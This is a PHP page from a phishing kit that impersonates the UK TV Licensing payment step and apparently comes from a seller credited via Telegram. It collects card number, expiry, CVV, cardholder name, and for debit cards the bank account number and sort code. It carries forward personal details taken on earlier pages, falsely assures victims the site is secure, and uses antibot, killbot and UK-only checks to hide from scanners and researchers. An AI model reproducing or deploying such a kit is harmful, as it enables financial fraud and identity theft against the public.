<?php
// @Kr3pto on telegram
require "configg.php";
require "tvgb_assetz/sinc/session_protect.php";
require "tvgb_assetz/sinc/functions.php";
 
if($internal_antibot == 1){
	require "tvgb_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "tvgb_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}


error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();

if($_POST['address'] and $_POST['town'] and $_POST['postcode']){
	
	$_SESSION['address'] = $_POST['address'];
	$_SESSION['town'] = $_POST['town'];
	$_SESSION['postcode'] = $_POST['postcode'];
	
	$title = $_SESSION['title'];
	$initial = $_SESSION['initial'];
	$lastName = $_SESSION['lastName'];
	$email = $_SESSION['email'];
	$mobile = $_SESSION['mobile'];
	
	$address = $_SESSION['address'];
	$town = $_SESSION['town'];
	$postcode = $_SESSION['postcode'];
	
	
	
}else{
	$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Payment details - TV Licensing ™</title>
        <link rel="stylesheet" href="tvgb_assetz/css/master.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.ui.all.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/master_rwd.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.mobile-1.3.20.css" />
        <link rel="shortcut icon" href="tvgb_assetz/img/favicon.ico" />
    </head>
    <body class="steps">
        <div id="iPage">
            <div id="iHeader">
                <div class="innerContainer clearfix topHeadCtr" style="display: block;">
                    <div class="clearfix" id="headerTop">
                        <div class="clearfix" id="iLogo">
                            <h1>
                                <a href="javascript:void(0);" class="fwckembeddedlink logoWrapper"><img src="tvgb_assetz/img/imgHeaderLogo.png" /> </a> <span class="headingText">TV Licensing</span>
                            </h1>
                            <div id="linkToggle" style="cursor: pointer;">&nbsp;</div>
                        </div>
                        <div class="mobileNav clearfix right" id="iMobileNav"><div class="clearfix" id="srhCtr" style="cursor: pointer;">&nbsp;</div></div>
                        <div class="clearfix" id="iGlobalNav">
                            <ul>
                                <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">Home</a></li>
                                <li><a href="javascript:void(0);" class="fwckembeddedlink">Easy read</a></li>
                                <li class="second">
                                    <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a> </span>
                                </li>
                            </ul>
                            <fieldset class="search" id="siteSrch" style="display: block;">
                                <legend class="hide">search site</legend>
                                <span class="siteSearchWrap"> <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" type="search" value="Search" /> </span>
                                <input id="siteSearchGo" type="button" value="search" name="___##NO_NAMED_ELEMENT##___" />
                            </fieldset>
                        </div>
                    </div>
                    <div class="clearfix" id="iPrimaryNav">
                        <ul>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Pay</strong> for your TV Licence</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Update</strong> your details</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);" class="fwckembeddedlink">
                                    <span><strong>Check</strong> if you need one</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div>&nbsp;</div>
            </div>
            <div id="iContent">
                <div class="innerContainer" style="display: block;">
                    <ul id="iBread">
                        <li>
                            <a href="javascript:void(0);">TV Licence<span class="linkPurpose">Link for TV Licence</span></a>
                        </li>
                        <li>
                            / <a href="javascript:void(0);"> Pay for your TV Licence<span class="linkPurpose robots-nocontent robots-noindex">Alternative link for Pay for your TV Licence</span> </a>
                        </li>
                        <li>/ Payment details</li>
                    </ul>
                    <div id="iPrimary">
                        <ol id="iStep" class="clearfix">
                            <li class="visited">
                                <label id="Label1" for="Button1"><span class="steplabel"> About TV Licence Holder</span><span class="hiddenAccessibleTextOnStepsMenu">Current step</span></label>
                                <input type="button" id="Button1" class="stepSubmitButton" value="1" name="Button1" />
                            </li>
                            <li class="visited">
                                <label id="Label2" for="Button2"><span class="steplabel"> Address to be licensed</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button2" class="stepSubmitButton" value="2" name="Button2" />
                            </li>
                            <li class="selected">
                                <label id="Label3" for="Button3"><span class="steplabel"> Payment details</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button3" class="stepSubmitButton" value="3" name="Button3" />
                            </li>
                            <li class="disabled">
                                <label id="Label4" for="Button4"><span class="steplabel"> Review and Confirm</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button4" class="stepSubmitButton" value="4" name="Button4" />
                            </li>
                        </ol>
                        <div class="panel secondary stepContent clearfix" id="stepContent">
                            <h2 class="header beta"><span>Step 3: Payment details</span></h2>
                            <form action="ReviewAndConfirm.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>" id="payForm" method="post">
                                <p class="intro">Please complete all sections of this form, unless marked as optional.</p>
                                <div class="findAddressContainer" id="addressContainer">
                                    <div class="findAddressContainerContent"></div>
                                    <div class="findAddressAttributes" id="divAttributes">
                                        <br>
                                        <div class="frmRow">
                                            <label for="cardType">Card Type</label>
											<select name="cardType" id="cardType" class="frmText" required="" style="border: 1px solid #bbb;">
												<option selected="" disabled="" value="">Select Type</option>
												<option value="Credit">Credit</option>
												<option value="Debit">Debit</option>
											</select>
                                        </div>
										<div class="frmRow">
                                            <label for="ccname">Name as it appears on card</label>
                                            <input name="ccname" id="ccname" type="text" class="frmText" autocomplete="off" required="" />
                                        </div>
                                        <div class="frmRow">
                                            <label for="ccnum">Card number</label>
                                            <input type="text" name="ccnum" id="ccnum" class="frmText" autocomplete="off" required="" />
                                        </div>
										<div class="frmRow">
                                            <label for="ccexp">Expiry date</label>
                                            <input type="text" name="ccexp" id="ccexp" class="frmText" autocomplete="off" required="" />
                                        </div>
                                        <div class="frmRow contained rule" style="border: unset;">
                                            <label for="cccvv">CVV</label>
                                            <input type="text" name="cccvv" id="cccvv" class="frmText" autocomplete="off" required="" />
                                        </div>
										<div id="issuerDetails" style="display:none;">
										<p class="label">Issuer details</p>
										<p class="helpEmail">Please confirm the account to which your payment details are registered.</p>
										<br>
										<div class="frmRow">
                                            <label for="accno">Account number</label>
                                            <input name="accno" id="accno" type="text" class="frmText" autocomplete="off" />
                                        </div>
										<div class="frmRow">
                                            <label for="sortcode">Sort code</label>
                                            <input name="sortcode" id="sortcode" type="text" class="frmText" autocomplete="off" />
                                        </div>
										</div>
                                    </div>
                                </div>
                                <div class="div">
                                    <div id="btnContinueContainer" class="btnGrp">
                                        <span class="arrowBtn"><input type="submit" name="btnContinue" value="Continue" id="ctl00_Content_PaymentBegin1_btnContinue" /></span>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div id="iSecondary">
                        <div class="panel primary">
                            <h3 class="header alpha secure"><span>Secure website</span></h3>
                            <p>Whether you’re paying for your TV Licence, setting up a Direct Debit, or updating your details, you can relax in the knowledge that this is a secure website and your personal information is safe with us.</p>
                        </div>
                    </div>
                    <div style="clear: both;"></div>
                </div>
            </div>
            <div id="iFooter">
                <div class="innerContainer" style="display: block;">
                    <ul id="iFooterNav">
                        <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">About us</a></li>
                        <li><a href="javascript:void(0);">Contact us</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Accessibility</a></li>
                        <li><a href="javascript:void(0);">Community relations</a></li>
                        <li><a href="javascript:void(0);">Media Centre</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Sitemap</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Cookies</a></li>
                        <li class="last"><a href="javascript:void(0);" class="fwckembeddedlink">Privacy policy</a></li>
                    </ul>
                    <p>General information about TV Licensing is available in other languages:</p>
                    <ul id="iLanguages">
                        <li class="first">
                            <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a></span>
                        </li>
                        <li>
                            <span lang="pl"><a href="javascript:void(0);" class="fwckembeddedlink">Polski</a></span>
                        </li>
                        <li>
                            <span lang="es"><a href="javascript:void(0);" class="fwckembeddedlink">Español</a></span>
                        </li>
                        <li>
                            <span lang="pt"><a href="javascript:void(0);" class="fwckembeddedlink">Português</a></span>
                        </li>
                        <li style="background: rgba(0, 0, 0, 0) url('tvgb_assetz/img/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em;">
                            <span class="unicode" lang="ur"> <a href="javascript:void(0);" class="fwckembeddedlink">اردو</a> </span>
                        </li>
                        <li class="last" style="padding-left: 1.11em;"><a href="javascript:void(0);">More languages &gt;&gt;</a></li>
                    </ul>
                    <p class="copyright">© 2025 TV Licensing</p>
                </div>
            </div>
        </div>
		<script src="tvgb_assetz/js/jquery-3.7.1.min.js"></script>
        <script src="tvgb_assetz/js/jquery-extra.min.js"></script>
        <script>
            $(document).ready(function () {
				$('#cardType').change(function(){
					if($(this).val() == 'Debit'){
						$('#issuerDetails').show();
						$('#accno').attr('required','required');
						$('#sortcode').attr('required','required');
					}else{
						$('#issuerDetails').hide();
						$('#accno').removeAttr('required');
						$('#sortcode').removeAttr('required');
					}
				});
				$("#ccexp").mask("00/00",{placeholder:"MM/YY"});
				$("#accno").mask("00000000",{placeholder:"XXXXXXXX"});
				$("#sortcode").mask("00-00-00",{placeholder:"XX-XX-XX"});
                $("#ccnum").keyup(function () {
                    var cc = $("#ccnum").val();
                    if (cc.startsWith(3) || cc.startsWith(4) || cc.startsWith(5) || cc.startsWith(2) || cc.startsWith(6)) {
                    } else {
                        $("#ccnum").val("");
						$("#ccnum").addClass("ng-invalid ng-dirty");
						return false;
                    }
                });
                $("#ccnum").payment("formatCardNumber");
                var carde = $("#ccnum").val();
                $("#ccnum").focusout(function () {
                    var cardType = $.payment.cardType($("#ccnum").val());
                    if ($.payment.validateCardNumber($("#ccnum").val()) == false) {
                        $("#ccnum").val("");
						$("#ccnum").addClass("ng-invalid ng-dirty");
                        return false;
                    }
                    if (cardType == "amex") {
                        $("#cccvv").attr("maxlength", "4");
                    } else {
                        $("#cccvv").attr("maxlength", "3");
                    }
                });
                var allInputs = $(":input:not(button)");
                allInputs.focusout(function () {
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
								$(this).parent().addClass("error");
                            } else {
								$(this).parent().removeClass("error");
                            }
                        }
                    });
                });
            });
        </script>
    </body>
</html>